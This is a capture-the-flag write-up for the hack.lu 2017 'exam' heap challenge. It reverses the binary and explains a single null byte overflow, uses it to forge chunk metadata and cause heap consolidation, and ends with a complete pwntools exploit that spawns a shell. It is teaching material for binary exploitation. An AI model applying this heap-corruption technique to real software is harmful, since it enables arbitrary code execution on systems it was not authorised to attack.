# hack.lu 2017 exam

This writeup is based off of: https://amritabi0s.wordpress.com/2017/10/19/hack-lu-2017-exam-write-up/

This is a heap exploitation challenge involving the use of heap consolidation to edit data you normally shouldn't be able to. This is done through the use of a single byte overflow/

## Reversing

#### get_line

```
__int64 __fastcall get_line(void *buf, unsigned __int64 maxSizeArg)
{
  void *currentByte; // rbx@1
  unsigned __int64 bytesRead; // rbp@1
  __int64 result; // rax@2

  currentByte = buf;
  bytesRead = 0LL;
  while ( 1 )
  {
    result = read(0, currentByte, 1uLL);
    if ( result == 0xFFFFFFFFFFFFFFFFLL )
      exit(0xFFFFFFFF);
    if ( *(_BYTE *)currentByte == 10 )
      break;
    ++bytesRead;
    currentByte = (char *)currentByte + 1;
    if ( maxSizeArg < bytesRead )
      goto LABEL_5;
  }
  *(_BYTE *)currentByte = 0;
  if ( maxSizeArg <= bytesRead )
LABEL_5:
    *((_BYTE *)buf + bytesRead) = 0;
  return result;
}
```

Here is the `get_line` function, which is a custom function used to scan in input. We can see that it scans in input one byte at a time using the `read` function. If it scan in more bytes of data then specified by `maxSizeArg`. We also see that if it scans in a newline character, the while loop breaks. We can also see that it null terminates the code by setting the byte specified by the index `currentByte` equal to `0x0` (if exited by the newline character option). This is a vulnerabillity since if we exit the code via  the newline character option, the index it used to null terminate `bytesRead` will be equal to the byte immediately following our last scanned in byte. With this, we will have a null byte overflow. In addition to that, since it scans in the byte before checking for an overflow, it will allow us to scan in an additional byte brefore we scan in more bytes than `maxSizeArg`, so we can control what the byte we overflow is. 

#### get_num

```
signed __int64 get_num()
{
  signed __int64 inputPtr; // [sp-18h] [bp-18h]@1
  __int64 stackCanary; // [sp-10h] [bp-10h]@1

  stackCanary = *MK_FP(__FS__, 40LL);
  inputPtr = 0xFFFFFFFFFFFFFFFFLL;
  if ( __isoc99_scanf("%llu", &inputPtr) != 1 )
    exit(0xFFFFFFFF);
  return inputPtr;
}
```

This is the function which scans in input. We can see that it uses `scanf` to scan in an unsigned long integer, and returns it.

#### handle_add_summary

```
int handle_add_summary()
{
  signed __int64 index; // rbx@2
  int result; // eax@5
  _QWORD *inputPtr; // rax@7

  if ( folder[0] )
  {
    index = 1LL;
    while ( folder[index] )
    {
      if ( ++index == 5 )
        goto LABEL_5;
    }
  }
  else
  {
    index = 0LL;
  }
  inputPtr = malloc(0x88uLL);
  folder[index] = (__int64)inputPtr;
  *inputPtr = 'YDUTSSTI';
  if ( index == 5 )
  {
LABEL_5:
    result = puts("Take some rest and study the other ones first!");
  }
  else
  {
    printf("Go to work! :-)\n> ");
    get_line((_BYTE *)(folder[index] + 8), 0x80uLL);
    result = puts("Summary successfully added!");
  }
  return result;
}
```

This is the function which handles the creating of a new summary. We cab see that it checks to make sure there aren't more than 5 summaries already made by iterating through all of the pointers stored in `folder` in the `bss` address `0x202040`. If there are not five pointers, it will allocate a `0x88` byte space in the heap with `malloc`. Proceeding that it will write the string `ITSSTUDY` to the first 8 bytes of the heap space. Proceeding that, it will scan in `0x80` bytes of space into that space immediately proceeding the `ITSSTUDY` string. 

#### handle_rem_summary

```
int handle_rem_summary()
{
  unsigned __int64 index; // rax@1
  unsigned __int64 indexTransfer; // rbx@2
  int result; // eax@4

  printf("Which one would you like to remove?\n> ");
  index = get_num();
  if ( index > 4 )
  {
    result = puts("I think you had too ambitious plans in the first place...");
  }
  else
  {
    indexTransfer = index;
    if ( folder[index] )
      puts("Got that memorized? Looks much better as a paper kite anyways. :-)");
    else
      puts("Nothing there, so let's just pretend. Feels good man!");
    free((void *)folder[indexTransfer]);
    folder[indexTransfer] = 0LL;
    result = puts("Summary successfully removed!");
  }
  return result;
}
```

Here is the the function responsible for removing summaries. We can see first that it prompts us for the index which we will want to delete, then checks to see if it is above `4`. If it isn't, then it will free the pointer stored at the offset specifice by the index, in `folder` which is stored in the bss address `0x202040`.

#### handle_study_summary

```
int handle_study_summary()
{
  unsigned __int64 index; // rax@1
  __int64 ptr; // rsi@2
  int result; // eax@3

  printf("Good student! Which summary would you like to review?\n> ");
  index = get_num();
  if ( index > 4 )
  {
    result = puts("Need a bigger folder?");
  }
  else
  {
    ptr = folder[index];
    if ( ptr )
      result = printf("Here we go, enjoy:\n%s\n", ptr + 8);
    else
      result = puts("I guess this one is still on your todo list...");
  }
  return result;
}
```

In this function (which is for studing the summaries) essentially just prints the contents of the summaries you made, after the first eight bytes to skip the string `ITSSTUDY`.

#### handle_create_crib

For this function, I did not fully reverse it. The important part is to note that it allocates a heap space that isn't equal to the `0x88` chunk that is always allocated in `handle_add_summary`.

#### handle_tear_crib

```
int handle_tear_crib()
{
  int result; // eax@3

  if ( crib )
  {
    if ( crib == (void *)0x5049525F )
    {
      result = puts("Only a pile of scraps is left. I've been there. Calm down, dude! :-/");
    }
    else
    {
      free(crib);
      crib = (void *)0x5049525F;
      result = puts("That felt awesome, didn't it? :-)");
    }
  }
  else
  {
    result = puts("You are trying to eat dessert before dinner. Create something to tear apart first!");
  }
  return result;
}
```

This function essentially just checks if `crib` (which is stored in the bss at the address `0x202068`) is equal to the hex string `0x5049525F`. If it isn't, then it will free the ptr stored in `crib`, then set it equal to `0x5049525F`.

#### handle_exam

```
void __noreturn handle_exam()
{
  unsigned __int64 index; // rax@1
  __int64 ptr; // rbx@2

  printf("You're allowed to bring one summary. Which one is it?\n> ");
  index = get_num();
  if ( index <= 4 && (ptr = folder[index]) != 0 )
  {
    if ( *(_QWORD *)ptr == 0x434947414D535449LL )
    {
      puts("Cheeky little fella. Screw math, you deserve a straight A!");
      system((const char *)(ptr + 8));
    }
    else
    {
      puts("Best of luck! :-) Here is your summary again:");
      puts((const char *)(ptr + 8));
    }
  }
  else
  {
    puts("Grasping into emptiness right there! Maybe we better stay at home today, shall we?");
  }
  exit(0);
}
```

So here is the function which will finish the code (also the most interesting). We can see that it prompts us for an index for a pointer stored in `folder`. If the first eight bytes (where `ITSSTUDY` is written) is equal to the hex string `0x434947414D535449` (ASCII `ITSMAGIC`), it will call system with the argument being the area of memory proceeding where it expects `ITSMAGIC`. We can see here, that our goal is to overwrite a heap object stored in `folder` with `ITSMAGIC`, and then we can call `system` with an argument that we can control. 

## Exploiting

#### One Null Byte Overflow 

So here we are going to show the single null byte overflow. We will start off with two summaries made, one with the string `15935728` and the other `75395128`:

```
gdb-peda$ x/4g 0x555555756040
0x555555756040 <folder>:	0x0000555555757010	0x00005555557570a0
0x555555756050 <folder+16>:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/s 0x0000555555757010
0x555555757010:	"ITSSTUDY15935728"
gdb-peda$ x/s 0x00005555557570a0
0x5555557570a0:	"ITSSTUDY75395128"
```

We will then move forward by deleteing the first summary, which will result in it being freed. After that, we can see that the pointer has been removed:

```
gdb-peda$ x/4g 0x555555756040
0x555555756040 <folder>:	0x0000000000000000	0x00005555557570a0
0x555555756050 <folder+16>:	0x0000000000000000	0x0000000000000000
```

So now we are going to create another summary. Since the allocation size is the same size each time, it should go where the last summary we just freed was. However this time we will use the single null byte overflow. We can scan in a max of `0x80` bytes of data starting at `0x0000555555757018` (it doesn't start scanning in untill `8` bytes after the start of the data section, because of the string `ITSSTUDY`). This means that we can scan data up untill `0x555555757098`. Then with the null byte overflow, we can overwrite the first byte of `0x555555757098` with `0x0`. Let's see what is at `0x555555757098`:

```
gdb-peda$ x/4g 0x555555757098
0x555555757098:	0x0000000000000091	0x5944555453535449
0x5555557570a8:	0x3832313539333537	0x0000000000000000
```

Keep in mind, that is that section of memory in between the new summary being allocated and `get_line` being called. We can see that we can overwrite the least significant byte of the `size` value for the second summary. It's current value is `0x91`, `0x90` because the code allocated `0x88` bytes of space plus `0x8` bytes for the metadata, and the `0x1` for the `previous_chunk_in_use` bit. Let's see what the value is after we exploit the null byte overflow by inputting `0x80` bytes of input (plus a newline character):

```
gdb-peda$ x/6g 0x555555757088
0x555555757088:	0x3030303030303030	0x3030303030303030
0x555555757098:	0x0000000000000000	0x5944555453535449
0x5555557570a8:	0x3832313539333537	0x0000000000000000
```

So we can see that we have successfully overwritten the byte `0x91` with a null byte (`0x00`).

### Heap Overwrite

So to get remote code execution on the challenge, we will have to overwrite the string `ITSSTUDY` with `ITSMAGIC` to a summary that we wrote `/bin/sh` to. In order to do this, we will be doing a heap consolidation. This involves ceating several different heap chunks, using the single byte overflow to edit the heap metadata for a chunk, and cause it to free a chunk and move the top chunk (consolidating) up past an allocated chunk, thus effictively forgetting about an allocated chunk. Then we can allocate another chunk that overlaps with it. The problem with this is, for the heap allocations made through the summaries, they are all the same size so we wouldn't be able to write over the string `ITSSTUDY` with a new allocation (since it will just overlap directly). However if we allocate a heap space by creating a crib, this will offset the heap enough so that we will be able to over the `ITSSTUDY` string.

This is how we will be manipulating the heap. First we will create a single summary:

```
0:	0x88	Summary 0
```

Next we will create another heap structure. This will be with the `create_crib` option, so it will allocate a heap object of a different size (in this case `0x19`) so when we do the heap consolidation, there will be an offset to allow us to overwrite `ITSSTUDY`:

```
0:	0x88	Summary 0
1:	0x19	Crib
```

Next we will allocate three additional summaries. These will be used for the heap consolidation, and the later heap manupulation.

```
0:	0x88	Summary 0
1:	0x19	Crib
2:	0x88	Summary 1
3:	0x88	Summary 2
4:	0x88	Summary 3
```

Next we will free summary `2`. This Will setup so we can allocate another chunk there, and write a fake previous size for chunk `3` and overflow the previous in use bit for chunk `3` to 0.

```
0:	0x88	Summary 0
1:	0x19	Crib
2:	0x88	Summary 1
3:	0x88	(freed)
4:	0x88	Summary 3
```

Now we will go ahead and write those two values. For the fake previous size, we will just write it in the eight bytes previous to the size integer for chunk `4` (which is stored in the previous eight bytes before `ITSSTUDY`). It is not currently apart of the memory for that chunk (since the previous chunk is allocated) so we can go ahead and write it there. Then we will use the single single byte overflow to overwrite the previous in use bit (the least significant bit for the size integer) to zero by writing the byte `0x90` (this is because we also need to perserver the size value for that chunk, which is `0x88` bytes plus `0x8` bytes of heap metadata).

```
0:	0x88	Summary 0
1:	0x19	Crib
2:	0x88	Summary 1
3:	0x88	Summary 2
4:	0x88	Summary 3 Previous size set to 0x1e0, previous in use bit overwritten to 0x0, size overwritten to 0x90
```

Now that we have manipulated the heap metadata for Summary 3, when we go and free it, it will think the previous chunk is freed (which it isn't). In addition to that, since we written the previous size to be the distance between the start of chunks `0` and `4`, it will think that chunk `0` is the previous chunk. We will first free chunk `0`, so when we consolidate the heap it will find a free chunk where it expects it to be.

```
0:	0x88	(freed)
1:	0x19	Crib
2:	0x88	Summary 1
3:	0x88	Summary 2
4:	0x88	Summary 3 Previous size set to 0x1e0, previous in use bit overwritten to 0x0
```

Now we will free chunk `4`. Due to our previous work, this will consolidate the heap to where chunk `0` is:

```
0:	0x88	(freed)
1:	0x19	Crib
2:	0x88	Summary 1
3:	0x88	Summary 2
4:	0x88	Summary 3 Previous size set to 0x1e0, previous in use bit overwritten to 0x0
```

Proceeding that, the heap is now consolidated and has effectively forgotten about chunks `1-3`. This will allow us to allocate overlapping chunks of memory to those chunks using `malloc`

```
0:	0x88	(freed) Heap consolidated here
1:	0x19	Crib Heap forgot about this chunk
2:	0x88	Summary 1 Heap forgot about this chunk
3:	0x88	Summary 2 Heap forgot about this chunk
4:	0x88	(freed)
```

Now that we have consolidated the heap to where chunk `0` is, we can go ahead and start allocating overlapping heap chunks. We will try and overwrite the values stored in chunk `2` (summary `1`). This is just because it is in the most convenient place to do so. Right now the start of our next summary which we will allocate (due to our previous work, we know it will go where the old chunk `0` was) will be `0xc0` (192) bytes away from the `ITSSTUDY` string we need to allocate in summary `1` (a bit more space than the space we specified `malloc` to allocate due to the heap metadata). If we were to allocate a summary, that would reduce the distance by `0x88` (136) bytes leaving us with `0x38` (56) bytes left. 

```
5:	0x88	Summary 0 overlaps with old chunk 0 and original Summary 0 
1:	0x19	Crib Heap forgot about this chunk
2:	0x88	Summary 1 Heap forgot about this chunk
3:	0x88	Summary 2 Heap forgot about this chunk
4:	0x88	(freed)
```

Now we can accomplish the rest with one more summary. The summary itself will take up another `0x10` (16) bytes (8 for the size value, eight for `ITSSTUDY`) before we can start writing. After that we will only have 40 bytes left untill we start overwriting `ITSSTUDY` with `ITSMAGIC` followed by `/bin/sh\x00` (we need the null byte to null terminate the string) for summary 1 which is within our range of `0x80` (128) bytes we can write:

```
5:	0x88	Summary 0 overlaps with old chunk 0 and original Summary 0 
6:	0x88	Encompasses old chunk 1, overlaps greatly with Chunk 2
2:	0x88	Summary 1 ITSSTUDY overwritten with ITSMAGIC followed by /bin/sh
3:	0x88	Summary 2 Heap forgot about this chunk
4:	0x88	(freed)
```

With that, we can just run the `handle_exam` function with summary one, it will pass the `ITSMAGIC` check, and will call `system` with `/bin/sh` as it's argument!

## Exploit

Here is the code for my exploit:

```
# This exploit is based off of: https://amritabi0s.wordpress.com/2017/10/19/hack-lu-2017-exam-write-up/

# Import pwntools
from pwn import *

# Establish the target process
target = process('./exam', env={'LD_PRELOAD': './libc.so.6'})
#gdb.attach(target)

# Establish the functions which we will use to interact with the target binary
def addSum(content):
	print target.recvuntil('>')
	target.sendline('1')
	print target.recvuntil('>')
	target.sendline(content)

def remSum(index):
	print target.recvuntil('>')
	target.sendline('2')
	print target.recvuntil('>')
	target.sendline(str(index))
def createCrib():
	print target.recvuntil('>')
	target.sendline('4')
def exam(index):
	print target.recvuntil('>')
	target.sendline('6')
	print target.recvuntil('>')
	target.sendline(str(index))

# Add the first summary
addSum('0'*0x7f)

# Add a heap object that is a different size than the rest of the heap objects
createCrib()

# Allocate three additional summaries to use for consolidation/later purposes
addSum('1'*0x7f)
addSum('2'*0x7f)
addSum('3'*0x7f)

# Free the second summary, than replace it with a value that will edit the third summaries heap metadata to believe the previous heap chunk is free and starts where chunk 0 is
remSum(2)
addSum('4'*0x78 + p64(0x1e0) + "\x90")

# Free the first and last summaries to cause heap consolidation
remSum(0)
remSum(3)

# Allocate another summary to take up space
addSum('5'*0x7f)

# Allocate a last summary to overwrite the data we need to with the first summary
addSum('6'*40 + "ITSMAGIC" + "/bin/sh\x00")

# handle the exam with the summary which we editied the data for
exam(1)

# Drop to an interactive shell
target.interactive()

# This exploit is based off of: https://amritabi0s.wordpress.com/2017/10/19/hack-lu-2017-exam-write-up/
```

when we run it:

```
$	python exploit.py
.	.	.
>
 You're allowed to bring one summary. Which one is it?
>
[*] Switching to interactive mode
 Cheeky little fella. Screw math, you deserve a straight A!
$ w
 00:19:04 up  4:27,  1 user,  load average: 0.40, 0.79, 0.78
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               19:51    4:27m 10:53   0.02s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
core        libc.so.6           peda-session-ls.txt          solved.py
exam        peda-session-dash.txt  peda-session-w.procps.txt  step0
exploit.py  peda-session-exam.txt  readme.md              step1
$ 
[*] Interrupted
[*] Stopped process './exam' (pid 20086)
```

Just like that, we popped a shell. Once again this writeup is based off of: This writeup is based off of: https://amritabi0s.wordpress.com/2017/10/19/hack-lu-2017-exam-write-up/
